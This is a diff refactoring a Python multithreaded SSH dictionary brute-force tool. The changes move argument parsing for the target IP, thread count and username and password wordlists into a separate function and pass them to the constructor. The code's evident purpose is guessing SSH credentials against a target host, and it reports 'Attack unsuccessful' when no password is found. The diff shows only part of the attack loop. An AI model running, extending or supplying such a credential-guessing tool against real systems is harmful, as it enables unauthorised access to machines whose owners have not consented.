@@ -6,37 +6,19 @@ from threading import Thread
 
 class SSHMultithread():
     #Constructor
-    def __init__(self):
-        self.ip = None #string
-        self.password_file_dir = None #directory of desired password wordlist
-        self.username_file_dir = None #directory of desired username wordlist
+    def __init__(self, target_ip, threads, username_file, password_file):
+        self.ip = target_ip #test with ip 192.168.43.100, #string
+        self.password_file_dir = password_file #directory of desired password wordlist
+        self.username_file_dir = username_file #directory of desired username wordlist
         self.password_list=[] #extract from directory, load into password queue
         self.username_list=[] #extract from directory, load into username queue
         self.passwords=queue.LifoQueue() #Passwords queue
         self.usernames=queue.LifoQueue() #Usernames queue
         self.correct_password = None #string
         self.correct_username = None #string      
-        self.threads = None #number of threads
+        self.threads = threads #number of threads
 
     def do_brute_force(self):
-        #parsing arguments
-        parser = argparse.ArgumentParser()
-        parser.add_argument('ip',help='Target IP Address, required')
-        parser.add_argument('threads', type=int, \
-            help='Numbers of threads, default is 50', nargs = '?', default=50)
-        parser.add_argument('passwords',help="Wordlist for password, \
-            default is 100pass.txt",nargs='?', default="100pass.txt")
-        parser.add_argument('usernames',help="Wordlist for usernames, \
-            default is usernames.txt",nargs='?',default="usernames.txt")
-        
-        
-        args = parser.parse_args()    
-
-        self.threads=args.threads
-        self.ip=args.ip
-        self.password_file_dir = args.passwords
-        self.username_file_dir=args.usernames
-
         #print the inputs to be used, code will start after 5s
         self.print_input()
 
@@ -54,6 +36,7 @@ class SSHMultithread():
         print('Usernames: %s' %(self.username_file_dir))
         print('Threads  : %s' %(self.threads))
         print('IP:      : %s\n' %(self.ip))
+        print('Start in 5s...')
         time.sleep(5) #Reading time :)
 
     def read_usernames_passwords(self):
@@ -116,12 +99,41 @@ class SSHMultithread():
                 finally:
                     self.passwords.task_done()
                     ssh_client.close()
+
+def parse_config():
+    #parsing arguments
+    parser = argparse.ArgumentParser()
+    parser.add_argument('ip',
+                        help='Target IP Address, required')
+    parser.add_argument('threads', 
+                        type=int, 
+                        help='Numbers of threads, default is 50', 
+                        nargs = '?', 
+                        default=50)
+    parser.add_argument('passwords',
+                        help="Wordlist for password, default is 100pass.txt",
+                        nargs='?', 
+                        default="100pass.txt")
+    parser.add_argument('usernames',
+                        help="Wordlist for usernames, default is usernames.txt",
+                        nargs='?',
+                        default="usernames.txt")
+    return parser.parse_args()
                                    
 #Main method
 if __name__ == '__main__':
     start = time.time()
-    dictionary_ssh = SSHMultithread()
+
+    #parsing arguments
+    args = parse_config()
+    number_of_threads=args.threads
+    target_ip=args.ip
+    password_file= args.passwords
+    username_file=args.usernames
+
+    dictionary_ssh = SSHMultithread(target_ip,number_of_threads,username_file,password_file)
     dictionary_ssh.do_brute_force()
+    
     end = time.time()
     if not dictionary_ssh.correct_password:
         print('Attack unsuccessful')
